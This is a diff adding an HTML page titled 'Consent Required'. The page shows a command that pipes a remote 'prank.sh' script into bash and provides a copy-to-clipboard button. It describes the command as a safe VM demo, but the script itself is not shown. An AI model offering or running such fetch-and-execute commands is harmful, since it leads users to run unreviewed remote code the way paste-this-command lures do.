@@ -1,0 +1,43 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Consent Required</title>
+  <style>
+    body { font-family: Arial; max-width: 700px; margin: 40px auto; }
+    .box { border: 1px solid #ccc; padding: 20px; border-radius: 10px; }
+    pre { background: #f4f4f4; padding: 10px; border-radius: 6px; }
+    button { padding: 10px; background: black; color: white; border-radius: 6px; cursor: pointer; }
+  </style>
+</head>
+<body>
+
+<h1>Consent Required</h1>
+
+<div class="box">
+  <p><b>Nothing runs automatically.</b></p>
+  <p>If you choose to run the command below, it will run a safe demo script inside your VM.</p>
+
+  <h3>Command:</h3>
+  <pre id="cmd">Loading...</pre>
+
+  <button onclick="copyCmd()">Copy Command</button>
+  <p id="copied" style="display:none;color:green;">Copied!</p>
+</div>
+
+<script>
+  const scriptUrl = new URL("prank.sh", window.location.href).toString();
+  const command = `curl -fsSL "${scriptUrl}" | bash`;
+  document.getElementById("cmd").textContent = command;
+
+  function copyCmd() {
+    navigator.clipboard.writeText(command);
+    document.getElementById("copied").style.display = "block";
+    setTimeout(() => {
+      document.getElementById("copied").style.display = "none";
+    }, 1500);
+  }
+</script>
+
+</body>
+</html>
